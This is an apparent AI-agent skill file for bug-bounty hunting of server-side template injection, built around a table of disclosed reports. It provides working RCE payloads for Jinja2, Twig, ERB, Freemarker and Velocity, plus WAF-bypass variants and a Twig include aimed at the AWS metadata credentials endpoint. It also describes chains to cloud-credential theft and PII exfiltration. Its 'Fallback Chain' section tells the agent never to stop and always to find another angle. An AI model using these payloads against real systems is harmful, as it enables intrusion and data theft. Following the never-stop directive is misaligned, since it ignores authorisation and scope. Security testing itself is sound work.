---
name: hunt-ssti
description: "Hunt server-side template injection (SSTI) across Jinja2 (Flask/Django), Twig (Symfony), Freemarker (Java), ERB (Rails), Spring, Velocity, Mako, Thymeleaf, Smarty. Detection probes use double-curly and dollar-curly math expressions evaluated server-side. Once an engine is fingerprinted, escalate to RCE via the engine-specific class-walker, callback-registrar, or Execute-utility patterns documented in disclosed reports. Detection patterns: error messages reveal engine, blank or numeric eval reveals expression mode. Targets: email templates, PDF/report generators, CMS preview features, error pages with user input. Use when hunting RCE via template rendering, when content shows engine fingerprints, when finding endpoints that compose strings with user input before render. Only invoke this skill if there is real impact potential. Skip theoretical findings."
---

## 14. SSTI — SERVER-SIDE TEMPLATE INJECTION
> Easy to detect, high payout ($2K–$8K). Direct path to RCE.

### Detection Payloads (try all)
```
{{7*7}}          → 49 = Jinja2 / Twig
${7*7}           → 49 = Freemarker / Velocity
<%= 7*7 %>       → 49 = ERB (Ruby)
#{7*7}           → 49 = Mako
*{7*7}           → 49 = Spring Thymeleaf
{{7*'7'}}        → 7777777 = Jinja2 (not Twig)
```

### RCE Payloads

**Jinja2 (Python/Flask):**
```python
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

**Twig (PHP/Symfony):**
```php
{{_self.env.registerUndefinedFilterCallback("exec")}}{{_self.env.getFilter("id")}}
```

**ERB (Ruby):**
```ruby
<%= `id` %>
```

### Where to Test
```
Name/bio/description fields, email templates, invoice name, PDF generators,
URL path parameters, search queries reflected in results, HTTP headers reflected
```

---

## Related Skills & Chains

- **`hunt-rce`** — SSTI is the easiest path to RCE on Python/Ruby/PHP/Java stacks because the template language already exposes the runtime. Chain primitive: Jinja2 `{{config.__class__.__init__.__globals__['os'].popen('id').read()}}` or Freemarker `<#assign x="freemarker.template.utility.Execute"?new()>${x("id")}` → unauthenticated RCE as the rendering worker. Always escalate fingerprint → class-walker → cmd exec.
- **`hunt-xss`** — When the template engine sandboxes the runtime (or you only get the rendered output back as HTML), the same `{{7*7}}` reflection often still yields stored XSS. Chain primitive: sandboxed Jinja2 SSTI without escapes → inject `<script>` into rendered email template → stored XSS hitting every recipient who views the message.
- **`hunt-ssrf`** — Template engines often expose URL fetchers/filters before they expose the runtime, giving you SSRF before RCE. Chain primitive: Twig `{{ include('http://169.254.169.254/latest/meta-data/iam/security-credentials/') }}` or Jinja2 with `url_for`/custom filters → AWS metadata exfil → cloud creds.
- **`hunt-file-upload`** — Office docs, SVGs, and email templates uploaded by the user are common SSTI surfaces (the server re-renders them). Chain primitive: upload a DOCX whose `word/document.xml` contains `${T(java.lang.Runtime).getRuntime().exec("id")}` to a Velocity/Freemarker-driven mail-merge → RCE.
- **`security-arsenal`** — Reach for the engine-specific escape payload tree: Jinja2 class-walker variants (`__subclasses__()[N]` index hunting), Twig `_self.env` registerUndefinedFilterCallback, Freemarker `?new()` Execute, ERB backticks, Velocity `$class.inspect`, Smarty `{php}...{/php}`, plus the WAF-bypass variants (`{{request|attr('application')|...}}`, Unicode escapes, `{%print(...)%}`).
- **`triage-validation`** — Apply the Pre-Severity Gate before claiming Critical RCE. A `{{7*7}} → 49` reflection inside a sandboxed engine (e.g., Twig sandbox mode, Jinja2 SandboxedEnvironment with no escape) is Medium SSTI, not Critical RCE. Prove `id`/OOB DNS callback with a unique marker before writing the report.

## Fallback Chain
1. Try the techniques in this skill first
2. If they fail or don't apply, use your own creativity
3. Never stop because a technique didn't work
4. Always find another angle

## Real-World Reports (from Community Writeups)

| Title | Program | Bounty | Source |
|---|---|---|---|
| Path traversal, SSTI and RCE on a MailRu acquisition | Mail.ru | $2,000 | H1 #536130 |
| [Ruby]: Server Side Template Injection (CodeQL) | GitHub Security Lab | $2,300 | H1 #1928279 |
| H1514 SSTI in Return Magic email templates | Shopify | $0 | H1 #423541 |
| Urgent: SSTI via Smarty allows RCE | Unikrn | $0 | H1 #164224 |
| Reflected XSS + SSTI in all HubSpot CMSes | HubSpot Inactive | $0 | H1 #399462 |
| SSTI on Name parameter during Sign Up | Glovo | $0 | H1 #1104349 |
| SSTI leads to Command injection | curl | $0 | H1 #3584149 |
| Python: Add query to detect SSTI | GitHub Security Lab | $0 | H1 #944359 |
| Java: Add query to detect SSTI | GitHub Security Lab | $0 | H1 #1490372 |
| CodeQL query to detect SSTI (JavaScript) | GitHub Security Lab | $0 | H1 #894872 |
| Server-side Template Injection in lodash.js | Node.js third-party | $0 | H1 #904672 |
| Server-side template injection at ujs test server | Ruby on Rails | $0 | H1 #942103 |

Limited paid public reports — most disclosed SSTI items are CodeQL detection PRs. Pay-outs are concentrated in private programs; public disclosures still document the engines.

**PROVEN techniques** (3+ reports / well-known engines):
- **Jinja2 / Liquid / Twig in email/notification templates** — Shopify Return Magic (#423541), HubSpot CMS (#399462), Mail.ru acquisition (#536130) — user-controlled name/subject field rendered server-side.
- **Smarty `{php}` block → RCE** — Unikrn (#164224): Smarty engine without `disable_php` allowed raw PHP execution from template.
- **Engine fingerprint by error messages / `{{7*'7'}}` differential** (49 vs 7777777 vs error) — every public writeup uses this to identify Jinja2 vs Twig vs Mako.

## High-Value Chains (from Reports)

- **Profile/name SSTI → RCE → mass data access** — Glovo (H1 #1104349): signup `name` field landed in a templated welcome email; payload escaped the sandbox via Python class-walker → `os.system`.
- **Path traversal → template overwrite → SSTI → RCE** — Mail.ru acquisition (H1 #536130, $2K): wrote attacker template to disk via traversal, then triggered render → code exec.
- **SSTI in transactional email template → exfil customer PII via render context** — Shopify Return Magic (#423541): merchant-controlled email template rendered against an internal context with customer email/address/phone, leaking PII across shops.
- **Smarty `{php}` block → unauth RCE** — Unikrn (#164224): bug bounty's archetypal Smarty break-out; template upload feature reachable without strict ACL.
- **SSTI → SSRF → IMDS read** — multiple reports use Jinja2 `urllib`/`requests` access to pivot from template eval into AWS credential theft.
